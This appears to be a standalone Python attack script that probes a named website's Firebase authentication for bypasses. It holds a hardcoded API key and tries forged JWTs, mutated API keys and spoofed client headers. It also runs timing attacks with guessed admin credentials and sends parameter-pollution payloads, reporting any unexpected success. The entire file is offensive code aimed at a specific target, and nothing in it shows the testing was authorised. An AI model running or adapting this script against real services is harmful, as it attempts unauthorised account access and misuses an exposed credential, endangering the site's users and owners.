import requests
import json
import time
import base64
import hashlib
import hmac
import urllib.parse

# Advanced authentication bypass techniques
def test_advanced_bypass():
    print("=== ADVANCED AUTHENTICATION BYPASS TECHNIQUES ===")
    
    auth_url = "https://uplinkai.in/auth"
    api_key = "AIzaSyA0grBMnQ2VnDKD-Q8QFkA7cirthBYcmFY"
    firebase_api_base = "https://identitytoolkit.googleapis.com/v1"
    
    print("1. Testing JWT token manipulation...")
    
    # Test with malformed JWT tokens
    malformed_tokens = [
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.fake_signature",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..fake_signature",
        ".eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.fake_signature",
        "not_a_jwt_token_at_all",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",
    ]
    
    for token in malformed_tokens:
        try:
            lookup_url = f"{firebase_api_base}/accounts:lookup?key={api_key}"
            response = requests.post(lookup_url, json={"idToken": token}, timeout=10)
            print(f"Malformed JWT: {response.status_code}")
            if response.status_code == 200:
                print(f"  ⚠️  UNEXPECTED SUCCESS!")
                print(f"  Response: {response.text}")
        except Exception as e:
            print(f"Malformed JWT error: {e}")
    
    print("\n2. Testing API key enumeration...")
    
    # Test with common API key patterns
    api_variants = [
        api_key + "123",
        api_key.replace("AIza", "AIzb"),
        api_key[:-4] + "0000",
        api_key + "test",
        "AIza" + "0" * 35,  # Zero-padded
    ]
    
    for variant in api_variants:
        try:
            test_url = f"{firebase_api_base}/accounts:lookup?key={variant}"
            response = requests.post(test_url, json={"idToken": "fake"}, timeout=10)
            print(f"API variant: {response.status_code}")
            if response.status_code != 400:
                print(f"  ⚠️  UNEXPECTED STATUS: {response.status_code}")
        except Exception as e:
            print(f"API variant error: {e}")
    
    print("\n3. Testing header manipulation...")
    
    # Test with manipulated headers
    headers_to_test = [
        {"X-Firebase-Client": "test-client"},
        {"X-Android-Cert": "fake_cert_hash"},
        {"X-Android-Package": "com.test.package"},
        {"X-IOS-Bundle-Identifier": "com.test.app"},
        {"Authorization": "Bearer fake_token"},
        {"X-User-Agent": "test-agent"},
    ]
    
    for headers in headers_to_test:
        try:
            signin_url = f"{firebase_api_base}/accounts:signInWithPassword?key={api_key}"
            response = requests.post(signin_url, 
                                   json={"email": "test@test.com", "password": "test"}, 
                                   headers=headers, timeout=10)
            print(f"Header manipulation: {response.status_code}")
        except Exception as e:
            print(f"Header test error: {e}")
    
    print("\n4. Testing timing attacks...")
    
    # Test for timing differences in responses
    test_credentials = [
        ("admin@uplinkai.in", "admin123"),
        ("admin@uplinkai.in", "wrongpassword"),
        ("nonexistent@uplinkai.in", "admin123"),
    ]
    
    for email, password in test_credentials:
        try:
            signin_url = f"{firebase_api_base}/accounts:signInWithPassword?key={api_key}"
            start_time = time.time()
            response = requests.post(signin_url, 
                                   json={"email": email, "password": password}, 
                                   timeout=10)
            end_time = time.time()
            duration = end_time - start_time
            print(f"Timing for {email}: {response.status_code} ({duration:.3f}s)")
        except Exception as e:
            print(f"Timing test error: {e}")
    
    print("\n5. Testing parameter pollution...")
    
    # Test with duplicate parameters
    signin_url = f"{firebase_api_base}/accounts:signInWithPassword?key={api_key}"
    
    polluted_params = [
        {"email": "admin@uplinkai.in", "password": "admin123", "email": "admin@gmail.com"},
        {"email": ["admin@uplinkai.in", "admin@gmail.com"], "password": "admin123"},
        {"email": "admin@uplinkai.in", "password": ["admin123", "test123"]},
    ]
    
    for params in polluted_params:
        try:
            response = requests.post(signin_url, json=params, timeout=10)
            print(f"Parameter pollution: {response.status_code}")
            if response.status_code == 200:
                print(f"  ⚠️  UNEXPECTED SUCCESS!")
        except Exception as e:
            print(f"Parameter pollution error: {e}")

if __name__ == "__main__":
    test_advanced_bypass()
